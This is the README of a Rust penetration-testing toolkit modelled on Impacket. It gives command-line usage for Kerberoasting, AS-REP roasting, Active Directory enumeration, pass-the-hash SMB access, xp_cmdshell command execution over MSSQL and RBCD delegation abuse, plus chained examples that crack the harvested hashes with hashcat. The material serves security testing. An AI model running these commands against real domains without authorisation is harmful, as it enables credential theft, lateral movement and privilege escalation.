<div align="center">

# rustPacket 🦀

**A Rust-based network security toolkit for Active Directory and network enumeration**

[![Rust](https://img.shields.io/badge/rust-1.70%2B-orange.svg)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)

</div>

## Overview

**rustPacket** is a collection of offensive and defensive network security tools written in Rust, inspired by the popular Python toolkit [Impacket](https://github.com/fortra/impacket) and its version in Golang, goPacket (https://github.com/mandiant/gopacket). It provides high-performance, memory-safe implementations of common Active Directory enumeration, Kerberos attacks, LDAP querying, and lateral movement utilities.

rustPacket is designed for penetration testers, red teamers, and security researchers who need reliable, fast tools for Active Directory assessments.

## Features

- **Kerberos attacks** — Kerberoasting, AS-REP Roasting
- **LDAP enumeration** — Users, computers, delegation rights
- **SMB client** — File sharing and lateral movement
- **MSSQL client** — Database interaction and privilege escalation
- **RBCD** — Resource-Based Constrained Delegation attacks
- **getTGT** — Kerberos TGT (Ticket Granting Ticket) request and export tool

## Installation

### From source

```bash
git clone https://github.com/ivancabrera02/rustPacket.git
cd rustPacket
cargo build --release
```

Binaries will be available at `target/release/`.

### Requirements

- Rust 1.70+
- Network access to the target environment
- Valid domain credentials (for most tools)

## Tools

### GetUsersSPN

Queries Active Directory for user accounts with SPNs (Service Principal Names) set and requests Kerberos TGS tickets for offline password cracking (Kerberoasting).

```bash
rustPacket-GetUsersSPN -dc-ip <DC_IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
```

**Options:**

| Flag | Description |
|------|-------------|
| `-dc-ip` | IP address of the domain controller |
| `-u` | Username for authentication |
| `-p` | Password for authentication |
| `-d` | Target domain (e.g. `corp.local`) |
| `-o` | Output file to save hashes |
| `--no-pass` | Use a null session |

**Example:**

```bash
rustPacket-GetUsersSPN -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local -o hashes.txt
```

---

### 🎟️ GetNPUsers

Performs AS-REP Roasting by querying for accounts with Kerberos pre-authentication disabled and requesting AS-REP hashes for offline cracking.

```bash
rustPacket-GetNPUsers -dc-ip <DC_IP> -d <DOMAIN> [-u <USER> -p <PASSWORD>]
```

**Options:**

| Flag | Description |
|------|-------------|
| `-dc-ip` | IP address of the domain controller |
| `-d` | Target domain |
| `-u` | (Optional) Username for authenticated enumeration |
| `-p` | (Optional) Password |
| `-usersfile` | File with list of usernames to test |
| `-o` | Output file to save AS-REP hashes |
| `--no-pass` | Unauthenticated mode |

**Example:**

```bash
# Unauthenticated with a user list
rustPacket-GetNPUsers -dc-ip 192.168.1.10 -d corp.local -usersfile users.txt -o asrep.txt

# Authenticated (enumerates all vulnerable accounts)
rustPacket-GetNPUsers -dc-ip 192.168.1.10 -d corp.local -u john -p 'Password123!'
```

---

### 🔍 LDAPCheckStatus

Checks LDAP connectivity and enumerates basic information from the target domain controller, including domain naming context, supported LDAP controls, and server version.

```bash
rustPacket-LDAPCheckStatus -dc-ip <DC_IP> [-d <DOMAIN>] [-u <USER> -p <PASSWORD>]
```

**Options:**

| Flag | Description |
|------|-------------|
| `-dc-ip` | IP address of the LDAP server |
| `-d` | (Optional) Domain for authenticated check |
| `-u` | (Optional) Username |
| `-p` | (Optional) Password |
| `--ssl` | Use LDAPS (port 636) |

**Example:**

```bash
rustPacket-LDAPCheckStatus -dc-ip 192.168.1.10
rustPacket-LDAPCheckStatus -dc-ip 192.168.1.10 -d corp.local -u john -p 'Password123!' --ssl
```

---

### 💻 GetADComputers

Enumerates all computer objects in Active Directory, including operating system, last logon, and other relevant attributes.

```bash
rustPacket-GetADComputers -dc-ip <DC_IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
```

**Options:**

| Flag | Description |
|------|-------------|
| `-dc-ip` | IP address of the domain controller |
| `-u` | Username |
| `-p` | Password |
| `-d` | Target domain |
| `--all` | Show all computer attributes |
| `-o` | Output results to file |

**Example:**

```bash
rustPacket-GetADComputers -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local --all
```

---

### 👥 GetADUsers

Enumerates all user accounts in Active Directory with their attributes including account status, last logon, group memberships, and more.

```bash
rustPacket-GetADUsers -dc-ip <DC_IP> -u <USER> -p <PASSWORD> -d <DOMAIN>
```

**Options:**

| Flag | Description |
|------|-------------|
| `-dc-ip` | IP address of the domain controller |
| `-u` | Username |
| `-p` | Password |
| `-d` | Target domain |
| `--all` | Show all user attributes |
| `--admin` | Filter only accounts with admin privileges |
| `-o` | Output results to file |

**Example:**

```bash
rustPacket-GetADUsers -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local --all -o users.txt
```

---

### 📁 SMBClient

An interactive SMB client for connecting to Windows file shares. Supports listing shares, uploading/downloading files, and browsing remote directories.

```bash
rustPacket-SMBClient //<TARGET>/<SHARE> -u <USER> -p <PASSWORD> -d <DOMAIN>
```

**Options:**

| Flag | Description |
|------|-------------|
| `//target/share` | Target UNC path |
| `-u` | Username |
| `-p` | Password |
| `-d` | Domain |
| `-H` | NTLM hash (Pass-the-Hash) |
| `-k` | Use Kerberos authentication |
| `--port` | Custom SMB port (default: 445) |

**Interactive commands:**

```
shares      List available shares
use <share> Connect to a share
ls          List files
cd <dir>    Change directory
get <file>  Download a file
put <file>  Upload a file
exit        Quit the client
```

**Example:**

```bash
# Password authentication
rustPacket-SMBClient //192.168.1.20/C$ -u administrator -p 'Password123!' -d corp.local

# Pass-the-Hash
rustPacket-SMBClient //192.168.1.20/C$ -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

### 🗄️ mssqlclient

An interactive MSSQL client for connecting to Microsoft SQL Server instances. Supports query execution, file read/write, OS command execution via `xp_cmdshell`, and privilege escalation techniques.

```bash
rustPacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
```

**Options:**

| Flag | Description |
|------|-------------|
| `-windows-auth` | Use Windows authentication |
| `-port` | Custom port (default: 1433) |
| `-db` | Target database |
| `-H` | NTLM hash for Pass-the-Hash |
| `-k` | Use Kerberos authentication |

**Interactive commands:**

```
SQL> enable_xp_cmdshell          Enable xp_cmdshell
SQL> xp_cmdshell whoami           Execute OS command
SQL> xp_cmdshell type C:\flag.txt Read files via cmdshell
SQL> enum_logins                  Enumerate SQL logins
SQL> enum_links                   Enumerate linked servers
SQL> use_link <server>            Pivot to a linked server
```

**Example:**

```bash
# Windows authentication
rustPacket-mssqlclient corp.local/john:'Password123!'@192.168.1.30 -windows-auth

# SQL authentication
rustPacket-mssqlclient sa:'Password123!'@192.168.1.30
```

---

### 🔁 rbcd

Automates Resource-Based Constrained Delegation (RBCD) attacks. Allows configuring `msDS-AllowedToActOnBehalfOfOtherIdentity` on target objects to obtain privileged access.

```bash
rustPacket-rbcd -dc-ip <DC_IP> -u <USER> -p <PASSWORD> -d <DOMAIN> -action <ACTION>
```

**Options:**

| Flag | Description |
|------|-------------|
| `-dc-ip` | IP address of the domain controller |
| `-u` | Username |
| `-p` | Password |
| `-d` | Target domain |
| `-action` | Action: `read`, `write`, `flush` |
| `-delegate-to` | Target account to configure delegation on |
| `-delegate-from` | Attacker-controlled computer account |

**Example:**

```bash
# Write RBCD — allow FAKE01$ to impersonate any user on TARGET$
rustPacket-rbcd -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local \
  -action write \
  -delegate-to TARGET$ \
  -delegate-from FAKE01$

# Read current RBCD settings on a target
rustPacket-rbcd -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local \
  -action read \
  -delegate-to TARGET$

# Remove RBCD settings
rustPacket-rbcd -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local \
  -action flush \
  -delegate-to TARGET$
```

---

## Common Attack Chains

### AS-REP Roasting → Offline Crack

```bash
rustPacket-GetNPUsers -dc-ip 192.168.1.10 -d corp.local -usersfile users.txt -o asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting → Offline Crack

```bash
rustPacket-GetUsersSPN -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local -o spn_hashes.txt
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

### LDAP Recon → SMB Access

```bash
rustPacket-LDAPCheckStatus -dc-ip 192.168.1.10 -d corp.local -u john -p 'Password123!'
rustPacket-GetADComputers -dc-ip 192.168.1.10 -u john -p 'Password123!' -d corp.local
rustPacket-SMBClient //192.168.1.20/ADMIN$ -u john -p 'Password123!' -d corp.local
```

---

## Contributing

Contributions are welcome! If you'd like to add a new tool or improve an existing one:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/new-tool`)
3. Write your code and tests
4. Commit your changes (`git commit -m 'Add new-tool'`)
5. Push to the branch (`git push origin feature/new-tool`)
6. Open a Pull Request

- Inspired by [Impacket](https://github.com/fortra/impacket) by Fortra
- Built with ❤️ and 🦀 Rust
